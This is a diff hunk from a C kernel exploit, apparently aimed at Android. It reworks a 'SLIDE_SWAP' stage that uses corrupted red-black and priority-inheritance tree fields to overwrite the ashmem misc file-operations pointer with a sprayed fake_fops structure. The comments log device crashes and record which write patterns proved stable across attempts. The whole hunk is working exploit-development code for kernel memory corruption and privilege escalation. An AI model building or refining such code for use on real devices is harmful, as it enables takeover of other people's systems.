@@ -1166,29 +1166,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * objects on the same page as fake_fops. BSS lock + heap
              * fake_fops as rb parent KPd at pselect (16:02 / 16:07).
              */
-            /* CLASSIC STORE-2 SWAP (fire-3 lesson): store-1's value IS
-             * tree_pc, so the red color bit leaks into the stored pointer
-             * (misaligned misc.fops = alignment fault at first open).
-             * Swap through STORE-2 instead (__rb_change_child writes the
-             * child into parent+8):
-             *   tree_pc = (slot-8)|1  — red throwaway parent in .data
-             *                           next to the slot (readable, no
-             *                           rebalance)
-             *   tree_r  = fake_fops   — CLEAN aligned pointer = the value
-             *   store-2: *(slot-8+8) = fake_fops  → *misc.fops = clean
-             *   store-1's cost: *(fake_fops+0) = (slot-8)|1 — owner slot
-             *   holds a VALID .data addr (fops_get's atomic inc/dec lands
-             *   in mapped memory; the historical crash was owner=1, a
-             *   near-NULL). */
-            tree_pc = (((uint64_t)data_addr(KIMAGE_TEXT_BASE +
-                          (active_offsets
-                               ? (uint64_t)active_offsets->off_ashmem_misc_fops
-                               : ASHMEM_MISC_FOPS_OFF))) - 8ULL) | 1ULL;
-            tree_r = (uint64_t)fake_fops;
-            tree_l = 0;
-            pi_parent = 0;
+            /* DUAL-TREE CLEAN SWAP (fire-4 lesson: only-right variant
+             * crashed at the walk; only-left + red is the 2x-proven
+             * walk-stable class). Both trees aim the slot:
+             *   main: pc = T|1 (red, NO rebalance) — stores T|1 first
+             *   pi:   pi_pc = T (CLEAN) — the dequeue_pi erase overwrites
+             *         the slot with the aligned pointer. pi-left-child
+             *         rebalance (T is black) walks T's own fields = our
+             *         zeroed sprayed page = defined/safe. Final value in
+             *         *misc.fops = clean T. */
+            tree_pc = (uint64_t)fake_fops | 1ULL;
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(KIMAGE_TEXT_BASE +
+                (active_offsets ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                                : ASHMEM_MISC_FOPS_OFF));
+            pi_parent = (uint64_t)fake_fops;
             pi_right = 0;
-            pi_left = 0;
+            pi_left = tree_l;
             stack_task = fake_task;
             stack_lock = fake_lock;
             /* prio MUST be 0 (09-13 device evidence: every surviving walk
@@ -1196,10 +1190,11 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
              * rate across park/cred/oracle classes). */
             stack_prio = 0;
             stack_deadline = 0;
-            pr_info("stack SLIDE_SWAP: *MISC.fops(%016llx) = fake_fops "
-                    "(%016llx) lock=spray\n",
+            pr_info("stack SLIDE_SWAP dual-tree: main *%016llx = %016llx "
+                    "(red) then pi overwrite -> clean %016llx lock=spray\n",
                     (unsigned long long)tree_l,
-                    (unsigned long long)tree_pc);
+                    (unsigned long long)tree_pc,
+                    (unsigned long long)pi_parent);
           } else if (env_flag("MODE4_SLIDE_VERIFY", 0)) {
             /*
              * PLACEMENT VERIFIER: write fake_fops (sprayed page address)
